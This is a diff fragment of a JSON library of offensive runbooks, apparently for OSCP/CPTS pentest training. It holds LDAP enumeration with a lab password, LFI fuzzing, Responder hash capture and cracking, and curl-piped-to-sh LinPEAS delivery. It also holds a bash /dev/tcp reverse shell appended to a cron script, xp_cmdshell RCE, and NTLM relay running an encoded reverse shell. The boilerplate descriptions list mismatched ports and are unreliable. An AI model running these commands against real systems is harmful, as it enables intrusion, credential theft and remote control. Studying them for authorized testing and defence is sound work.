+    "command": "impacket-ldapsearch -u rose -p 'KxEPkKe6R8su' -d sequel.htb -dc-ip 10.10.11.51 -l 10.10.11.51 -t all\nldapsearch -v -x -b \"DC=hutch,DC=offsec\" -H \"ldap://{IP}\" \"(objectclass=*)\"\nldapsearch -x -H ldap://{IP} -D '' -w '' -b \"DC=vault,DC=offsec\" | grep sAMAccountName",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>LDAP Password Policy and User Extraction</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#impacket</span> , <span style=\"color:#ef4444;font-weight:bold;\">#ldapsearch</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Collects directory metadata, policy signals, and candidate usernames via LDAP queries.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:157; docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:159</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 389</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>impacket-ldapsearch -u rose -p &#x27;KxEPkKe6R8su&#x27; -d sequel.htb -dc-ip 10.10.11.51 -l 10.10.11.51 -t all\nldapsearch -v -x -b &quot;DC=hutch,DC=offsec&quot; -H &quot;ldap://{IP}&quot; &quot;(objectclass=*)&quot;\nldapsearch -x -H ldap://{IP} -D &#x27;&#x27; -w &#x27;&#x27; -b &quot;DC=vault,DC=offsec&quot; | grep sAMAccountName</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:network",
+      "tool:impacket",
+      "focus:credentials"
+    ]
+  },
+  {
+    "id": "b7d9c623-eed2-5b20-a03e-7104c8de80b7",
+    "label": "LFI Discovery and Path Traversal Fuzzing",
+    "command": "ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<HOST>/index.php?page=FUZZ' -fs <SIZE>\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<HOST>/index.php?language=../../../../FUZZ/index.php' -fs <SIZE>",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>LFI Discovery and Path Traversal Fuzzing</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#ffuf</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Automates local file inclusion path probing across common Linux web roots.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:714; docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:720</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u &#x27;http://&lt;HOST&gt;/index.php?page=FUZZ&#x27; -fs &lt;SIZE&gt;\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u &#x27;http://&lt;HOST&gt;/index.php?language=../../../../FUZZ/index.php&#x27; -fs &lt;SIZE&gt;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:initial-access",
+      "domain:web",
+      "tool:ffuf",
+      "focus:web-testing"
+    ]
+  },
+  {
+    "id": "a924687a-24ed-51c2-8ec0-471941840040",
+    "label": "LLMNR/NBT-NS Poisoning and NTLMv2 Capture",
+    "command": "sudo responder -I <IFACE> -Pv\nhashcat -m 5600 responder_hashes.txt /usr/share/wordlists/rockyou.txt",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>LLMNR/NBT-NS Poisoning and NTLMv2 Capture</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#responder</span> , <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Captures NetNTLMv2 challenge responses and attempts offline cracking.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Active Directory Enumeration and Attacks.md:23; docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Active Directory Enumeration and Attacks.md:24</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>sudo responder -I &lt;IFACE&gt; -Pv\nhashcat -m 5600 responder_hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:credential-access",
+      "domain:offensive",
+      "tool:responder",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "e41e1468-5cfe-52bc-84f8-5b468c00ea4a",
+    "label": "Ligolo-ng TUN Pivot and Route Injection",
+    "command": "sudo ip tuntap add user <user> mode tun ligolo\nsudo ip link set ligolo up\nsudo ip route add <INTERNAL_CIDR> dev ligolo",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Ligolo-ng TUN Pivot and Route Injection</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#ip</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Creates tun-based pivoting without SOCKS limitations for deeper internal operations.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/dollarboysushil-oscp-cpts-notes/pivoting-and-tunneling/ligolo-ng.md:27; docs/sources-runbooks/oscp-cpts/p0/dollarboysushil-oscp-cpts-notes/pivoting-and-tunneling/ligolo-ng.md:29</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>sudo ip tuntap add user &lt;user&gt; mode tun ligolo\nsudo ip link set ligolo up\nsudo ip route add &lt;INTERNAL_CIDR&gt; dev ligolo</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:pivoting",
+      "domain:offensive",
+      "tool:ip",
+      "focus:pivoting"
+    ]
+  },
+  {
+    "id": "fadad8dd-a5c0-5ad0-bb50-2220702bc626",
+    "label": "LinPEAS Delivery and Deep Linux PrivEsc Scan",
+    "command": "wget http://10.10.14.1:8000/linpeas.sh\n./linpeas.sh\ncurl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>LinPEAS Delivery and Deep Linux PrivEsc Scan</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#wget</span> , <span style=\"color:#ef4444;font-weight:bold;\">#linpeas</span> , <span style=\"color:#ef4444;font-weight:bold;\">#curl</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Stages and runs LinPEAS for comprehensive Linux privilege-escalation surface mapping.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Getting Started.md:85; docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Getting Started.md:75</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>wget http://10.10.14.1:8000/linpeas.sh\n./linpeas.sh\ncurl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:privilege-escalation",
+      "domain:web",
+      "tool:wget",
+      "focus:privilege-escalation"
+    ]
+  },
+  {
+    "id": "b6ca6448-f285-5a97-aa73-bd0ac3648ab1",
+    "label": "Linux Cron Abuse Enumeration",
+    "command": "crontab -l\necho 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> backups.sh",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Linux Cron Abuse Enumeration</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#crontab</span> , <span style=\"color:#ef4444;font-weight:bold;\">#echo</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Detects writable/executable cron paths and weaponizes scheduled task execution.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/lagarian-smith-oscp-cheat-sheet/OSCP_Notes.md:1754; docs/sources-runbooks/oscp-cpts/p0/lagarian-smith-oscp-cheat-sheet/OSCP_Notes.md:1813</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>crontab -l\necho &#x27;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&#x27; &gt;&gt; backups.sh</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:privilege-escalation",
+      "domain:linux",
+      "tool:crontab",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "afee6718-d233-5269-b928-f858bb9dc332",
+    "label": "Linux File Staging and Transfer Workflow",
+    "command": "python3 -m http.server 80\npython3 -m http.server 8080",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Linux File Staging and Transfer Workflow</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#python3</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Stages tooling and payloads quickly during foothold and escalation phases.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:662; docs/sources-runbooks/oscp-cpts/p0/lagarian-smith-oscp-cheat-sheet/OSCP_Notes.md:1502</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>python3 -m http.server 80\npython3 -m http.server 8080</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:web",
+      "tool:python3",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "9f459ad2-b2a4-568b-971e-78ea113da4e9",
+    "label": "Linux PrivEsc Quick Baseline Checklist",
+    "command": "id\nuname -a\nsudo -l",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Linux PrivEsc Quick Baseline Checklist</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#id</span> , <span style=\"color:#ef4444;font-weight:bold;\">#uname</span> , <span style=\"color:#ef4444;font-weight:bold;\">#-l</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Minimal triage set to establish privilege context and obvious escalation avenues.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:546; docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:554</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>id\nuname -a\nsudo -l</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:privilege-escalation",
+      "domain:linux",
+      "tool:id",
+      "focus:privilege-escalation"
+    ]
+  },
+  {
+    "id": "9842c9e5-ac9c-5f21-9609-ef20df70d3be",
+    "label": "Linux SUID and Capability Audit",
+    "command": "find / -perm -4000 -type f 2>/dev/null\n/usr/sbin/getcap -r / 2>/dev/null",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Linux SUID and Capability Audit</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#find</span> , <span style=\"color:#ef4444;font-weight:bold;\">#getcap</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Finds privileged binaries and file capabilities suitable for GTFOBins-style escalation.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/lagarian-smith-oscp-cheat-sheet/OSCP_Notes.md:1722; docs/sources-runbooks/oscp-cpts/p0/0xsyr0-OSCP/README.md:6150</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>find / -perm -4000 -type f 2&gt;/dev/null\n/usr/sbin/getcap -r / 2&gt;/dev/null</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:privilege-escalation",
+      "domain:linux",
+      "tool:find",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "ab0d8d29-c35e-580c-b71b-a5f921e81728",
+    "label": "MSSQL xp_cmdshell Enablement and RCE",
+    "command": "impacket-mssqlclient sequel.htb/rose:'KxEPkKe6R8su'@10.10.11.51\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\nSQL> xp_cmdshell whoami",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>MSSQL xp_cmdshell Enablement and RCE</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#impacket</span> , <span style=\"color:#ef4444;font-weight:bold;\">#exec</span> , <span style=\"color:#ef4444;font-weight:bold;\">#xp_cmdshell</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Turns MSSQL access into OS command execution for lateral movement and staging.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:150; docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:154</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 1433</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>impacket-mssqlclient sequel.htb/rose:&#x27;KxEPkKe6R8su&#x27;@10.10.11.51\nEXEC sp_configure &#x27;xp_cmdshell&#x27;, 1; RECONFIGURE;\nSQL&gt; xp_cmdshell whoami</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:network",
+      "tool:impacket",
+      "focus:web-testing"
+    ]
+  },
+  {
+    "id": "1d878be2-89ac-5362-9385-5e4e7ea821ec",
+    "label": "NFS Share Discovery and Mount Workflow",
+    "command": "showmount -e <IP>\nmount -t nfs <IP>:/<SHARE> <LOCAL_FOLDER>\nmount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>NFS Share Discovery and Mount Workflow</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#nfs</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Enumerates exported NFS shares and mounts them locally for loot/execution opportunities.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:460; docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:466</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP/UDP 111</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 2049</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>showmount -e &lt;IP&gt;\nmount -t nfs &lt;IP&gt;:/&lt;SHARE&gt; &lt;LOCAL_FOLDER&gt;\nmount -t nfs &lt;FQDN/IP&gt;:/&lt;share&gt; ./target-NFS/ -o nolock</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:network",
+      "tool:nfs",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "d5e5655a-194f-51d0-b0dd-fec841334b83",
+    "label": "NTLM Relay to SMB with RCE",
+    "command": "impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP>\nimpacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c 'powershell -enc <B64_REVSHELL>'",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>NTLM Relay to SMB with RCE</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#impacket</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Relays captured NTLM authentication to execute commands on relay targets.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Attack Common Services.md:29; docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Attack Common Services.md:30</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 445</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>impacket-ntlmrelayx --no-http-server -smb2support -t &lt;TARGET_IP&gt;\nimpacket-ntlmrelayx --no-http-server -smb2support -t &lt;TARGET_IP&gt; -c &#x27;powershell -enc &lt;B64_REVSHELL&gt;&#x27;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:credential-access",
+      "domain:web",
+      "tool:impacket",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "ab5f00b2-4837-5221-a467-f9a7e5e95fcd",
+    "label": "Nikto Baseline Web Misconfiguration Scan",
+    "command": "nikto -h <URL>\nnikto -host IP\nnikto -h target.com",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Nikto Baseline Web Misconfiguration Scan</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#nikto</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Performs quick signature-based checks for common web server weaknesses and defaults.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:309; docs/sources-runbooks/oscp-cpts/p0/sachinn403-HTB-CPTS/1-reconnaissance-and-enumeration/enumeration/initial-enumeration.md:209</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>nikto -h &lt;URL&gt;\nnikto -host IP\nnikto -h target.com</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:initial-access",
+      "domain:web",
+      "tool:nikto",
+      "focus:web-testing"
+    ]
+  },
+  {
+    "id": "c8da4728-bee5-5153-b55d-ac1cd839fd0d",
+    "label": "Nmap Baseline Service Recon",
+    "command": "nmap -sC -sV -T4 <IP>\nnmap -p- <IP>",
+    "color": "#dc2626",
